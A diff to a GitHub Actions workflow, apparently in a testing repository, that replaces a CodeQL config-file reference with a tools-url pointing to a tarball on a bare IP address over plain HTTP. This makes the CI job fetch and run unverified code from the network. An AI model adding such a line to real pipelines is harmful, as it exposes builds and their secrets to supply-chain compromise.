@@ -42,7 +42,7 @@ jobs:
     - name: Get custom config
       uses: github/codeql-action/init@v1
       with:
-        config-file: mokrz-enterprise-testing/codescanning-config/.github/codeql/codeql-config.yml@main
+        tools-url: http://13.52.74.190/codeql-bundle-linux64.tar.gz
 
     # Initializes the CodeQL tools for scanning.
     #- name: Initialize CodeQL
